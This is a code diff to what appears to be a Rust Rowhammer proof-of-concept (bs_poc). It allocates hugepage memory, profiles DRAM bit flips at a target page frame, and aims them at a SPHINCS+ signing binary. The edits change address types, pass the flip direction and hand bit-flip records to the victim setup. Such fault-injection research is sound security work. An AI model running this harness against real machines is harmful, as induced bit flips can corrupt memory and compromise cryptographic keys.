@@ -7,7 +7,6 @@ use std::{
 };
 
 use anyhow::bail;
-use bs_poc::memory::{mem_configuration::MemConfiguration, GetConsecPfns};
 use bs_poc::{
     allocator::hugepage::HugepageAllocator,
     hammerer::{make_hammer, HammerResult, HammerStrategy},
@@ -29,6 +28,10 @@ use bs_poc::{
     memory::PfnResolver,
 };
 use bs_poc::{hammerer::Hammering, victim::sphincs_plus::TARGET_OFFSETS_SHAKE_256S};
+use bs_poc::{
+    memory::{mem_configuration::MemConfiguration, GetConsecPfns, PhysAddr},
+    util::PAGE_SIZE,
+};
 use bs_poc::{
     memory::{BytePointer, ConsecBlocks, ConsecCheckBankTiming},
     retry,
@@ -349,7 +352,7 @@ unsafe fn _main() -> anyhow::Result<()> {
     #[derive(Serialize)]
     struct HammerStatistic {
         alloc_duration_millis: u128,
-        memory_regions: Vec<Range<u64>>,
+        memory_regions: Vec<Range<PhysAddr>>,
         bit_flips: Vec<Vec<BitFlip>>,
     }
     let mut stats = vec![];
@@ -365,9 +368,7 @@ unsafe fn _main() -> anyhow::Result<()> {
         let start = std::time::Instant::now();
         let memory = allocator::alloc_memory(&mut alloc_strategy, mem_config, &pattern.mapping)?;
         let target_pfn = memory
-            .addr(
-                TARGET_OFFSETS_SHAKE_256S[0].page_offset + TARGET_OFFSETS_SHAKE_256S[0].target_size,
-            )
+            .addr(PAGE_SIZE + TARGET_OFFSETS_SHAKE_256S[0].page_offset)
             .pfn()?;
         let alloc_duration = std::time::Instant::now() - start;
         info!("Allocated {} bytes of memory", memory.len());
@@ -390,6 +391,7 @@ unsafe fn _main() -> anyhow::Result<()> {
             true,
             None,
             target_pfn,
+            TARGET_OFFSETS_SHAKE_256S[0].flip_direction.clone(),
         )?;
         let profiling = hammer_profile(
             &profile_hammer,
@@ -431,12 +433,12 @@ unsafe fn _main() -> anyhow::Result<()> {
             info!("Profiling done. Found {:?}", profiling);
         }
 
-        let addrs = profiling
+        let flips = profiling
             .iter()
-            .flat_map(|prof| prof.bit_flips.iter().map(|f| f.addr))
+            .flat_map(|p| p.bit_flips.clone())
             .collect_vec();
 
-        let mut victim = match make_victim(args.target.clone().unwrap_or(Target::None), addrs) {
+        let mut victim = match make_victim(args.target.clone().unwrap_or(Target::None), flips) {
             Ok(victim) => victim,
             Err(e) => {
                 memory.dealloc();
@@ -483,6 +485,7 @@ unsafe fn _main() -> anyhow::Result<()> {
             false, // this MUST be false for SphincsPlus victim (due to SIGSTOP handlers)
             None,
             target_pfn,
+            TARGET_OFFSETS_SHAKE_256S[0].flip_direction.clone(),
         )?;
         let mut results = vec![];
         for _ in 0..NUM_HAMMER_ROUNDS {
@@ -530,10 +533,10 @@ unsafe fn _main() -> anyhow::Result<()> {
 }
 
 #[allow(clippy::result_large_err)]
-fn make_victim(target: Target, addrs: Vec<usize>) -> Result<Victim, ExperimentError> {
+fn make_victim(target: Target, flips: Vec<BitFlip>) -> Result<Victim, ExperimentError> {
     match target {
         Target::SphincsPlus { binary } => Ok(Victim::SphincsPlus(
-            victim::SphincsPlus::new(binary, addrs).map_err(|e| {
+            victim::SphincsPlus::new(binary, flips).map_err(|e| {
                 warn!("Failed to create victim: {}", e);
                 format!("Failed to create victim: {}", e)
             })?,
